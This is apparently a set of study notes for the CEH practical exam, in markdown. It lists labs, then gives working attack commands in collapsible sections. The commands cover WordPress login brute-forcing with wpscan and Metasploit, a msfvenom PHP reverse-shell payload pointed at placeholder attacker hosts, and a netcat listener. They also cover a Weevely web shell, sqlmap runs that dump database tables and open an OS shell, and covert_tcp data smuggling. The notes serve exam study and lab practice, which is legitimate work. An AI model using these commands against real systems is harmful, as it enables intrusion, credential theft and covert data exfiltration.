# 🧪 Labs

## Labs Walkthrough 🔭

* [2 - Footprinting & Reconnaissance](2-footprinting-and-recon.md)
* [3 - Scanning Networks](3-scanning-networks.md)
* [4 - Enumeration](4-enumeration.md)
* [5 - Vulnerability Analysis](5-vulnerability-analysis.md)
* [6 - System Hacking](6-system-hacking.md)
* [8 - Sniffing](8-sniffing.md)
* [10 - DoS](10-dos.md)
* [13 - Hacking Web Servers](13-hacking-web-servers.md)
* [14 - Hacking Web Applications](14-hacking-web-apps.md)
* [15 - SQL Injection](15-sql-injection.md)
* [17 - Hacking Mobile Platform](17-hacking-mobile.md)
* [19 - Cloud Computing](19-cloud-computing.md)
* [20 - Cryptography](20-cryptography.md)



## [Website Hacking/Password Cracking](https://github.com/infovault-Ytube/CEH-Practical-Notes#website-hackingpassword-cracking) <a href="#user-content-website-hackingpassword-cracking" id="user-content-website-hackingpassword-cracking"></a>

<details>

<summary>Website Cracking</summary>

* SkipFish : Active Recon for Websites

```
skipfish -o 202 http://192.168.1.202/wordpress
```

* Wordpress Site Login BruteForce [Step-By-Step](https://www.hackingarticles.in/multiple-ways-to-crack-wordpress-login/)

```
# Wordpress site only Users Enumeration
wpscan --url http://example.com/ceh --enumerate u 

# Direct crack if we have user/password details

wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt

# Using Metaspoilt
msfdb init && msfconsole
msf > use auxiliary/scanner/http/wordpress_login_enum
msf auxiliary(wordpress_login_enum) > set rhosts 192.168.1.100
msf auxiliary(wordpress_login_enum) > set targeturi /wordpress
msf auxiliary(wordpress_login_enum) > set user_file user.txt
msf auxiliary(wordpress_login_enum) > set pass_file pass.txt
msf auxiliary(wordpress_login_enum) > exploit
  
  
```

#### [File Upload Vulnerability](https://github.com/infovault-Ytube/CEH-Practical-Notes#file-upload-vulnerability) <a href="#user-content-file-upload-vulnerability" id="user-content-file-upload-vulnerability"></a>

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f raw > file.php
  
msfdb init && msfconsole
use multi/handler
set payload php/meterepreter/reverse_tcp
set LHOST=attacker-ip
set LPORT= attcker-port
run

# If incase, metaspolit not working use NetCat and shell code below
```

[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) : Use the code, change IP & Port and use it with NetCat listener

```
nc -vnl -p 1234
```

[Weevely](https://www.kali.org/tools/weevely/) : Generate PHP Reverse shell

```
  
weevely generate password123 /home/error.php

# Upload the above error.php to website and use the below cmd to get reverse shell

weevely http://domain.com/error.php password123  
```

#### [SQL Injection](https://github.com/infovault-Ytube/CEH-Practical-Notes#sql-injection) <a href="#user-content-sql-injection" id="user-content-sql-injection"></a>

Login bypass with [' or 1=1 --](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt) [N-Stalker](https://www.nstalker.com/) : Select OWASP Policy => Scan Website for Vulnerabilites

SQLMAP

```
#List databases, add cookie values
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --dbs 
  OR
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”   --data="id=1&Submit=Submit" --dbs  


# List Tables, add databse name
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name --tables  
  
# List Columns of that table
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --columns
  
#Dump all values of the table
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
  

sqlmap -u "http:domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --os-shell
 
```

* Some links [DVWA:Blind SQL with SQLMap](https://medium.com/hacker-toolbelt/dvwa-1-9-viii-blind-sql-injection-with-sqlmap-ee8d59fbdea7), [DVWA - High Level with SQLMap](https://www.youtube.com/watch?v=IR1JsaSQLMc\&ab\_channel=Archidote)

</details>

<details>

<summary>Password Cracking</summary>



</details>

<details>

<summary>Cipering / Encrypting/ Hashes</summary>



</details>





<details>

<summary>Covert</summary>

Covert\_tcp [source code](https://github.com/infovault-Ytube/CEH-Practical-Notes/blob/main/covert\_tcp.c) Live Demo [Covert TCP Live Demo-Youtube](https://www.youtube.com/watch?v=bDcz4qIpiQ4)

```
# Compile the Code  
cc -o covert_tcp covert_tcp.c
  
# Reciever Machine(192.168.29.53)  
sudo ./covert_tcp -dest 192.168.29.53 -source 192.168.29.123 -source_port 9999 -dest_port 8888 -server -file recieve.txt  
 
# Sender Machine(192.168.29.123) 
# Create A Message file that need to be transferred Eg:secret.txt
sudo ./covert_tcp -dest 192.168.29.53 -source 192.168.29.123 -source_port 8888 -dest_port 9999 -file secret.txt
```

[Wireshark Capture](https://github.com/infovault-Ytube/CEH-Practical-Notes/blob/main/Covert\_TCP-Capture.pcapng) Hello This 123 -

[![](https://github.com/infovault-Ytube/CEH-Practical-Notes/raw/main/covertCapture.jpg)](https://github.com/infovault-Ytube/CEH-Practical-Notes/blob/main/covertCapture.jpg)

</details>

